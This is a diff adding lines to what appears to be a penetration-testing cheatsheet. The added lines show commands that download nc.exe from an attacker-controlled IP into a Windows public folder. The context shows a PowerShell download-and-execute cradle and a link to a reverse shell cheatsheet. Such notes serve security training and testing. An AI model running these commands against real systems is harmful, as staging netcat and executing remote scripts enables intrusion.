@@ -1243,6 +1243,9 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.1.3/Inv
 #### Reverse Shell Cheatsheet
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
+*Sometimes you need to escape the characters when writing `nc.exe` to a public folder, e.g. `wget http://IP/nc.exe -O C:\\Users\\Public\\nc.exe`
+Powershell version: `powershell.exe wget http://192.168.119.138/nc.exe -OutFile c:\\Users\\Public\\nc.exe`
+
 #### Crafted Payloads
 Using `msfvenom`:
 
